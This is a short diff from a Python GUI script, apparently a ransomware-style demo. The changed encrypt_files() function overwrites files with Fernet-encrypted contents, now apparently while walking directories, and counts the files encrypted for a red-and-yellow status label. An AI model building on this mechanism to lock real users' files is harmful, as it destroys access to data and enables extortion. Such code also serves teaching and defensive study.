@@ -54,10 +54,12 @@ def encrypt_files():
             contents = thefile.read()
         contents_encrypted = Fernet(key).encrypt(contents)
 
-        with open(file, "wb") as thefile:
-            thefile.write(contents_encrypted)
+                with open(filepath, "wb") as thefile:
+                    thefile.write(contents_encrypted)
 
-    result_label.config(text=f"Following files have been encrypted: {files}", fg="yellow", bg="red")
+                total_files_encrypted += 1
+
+    result_label.config(text=f"Total files encrypted: {total_files_encrypted}", fg="yellow", bg="red")
 
 
 #function to decrypt all files in the current directory
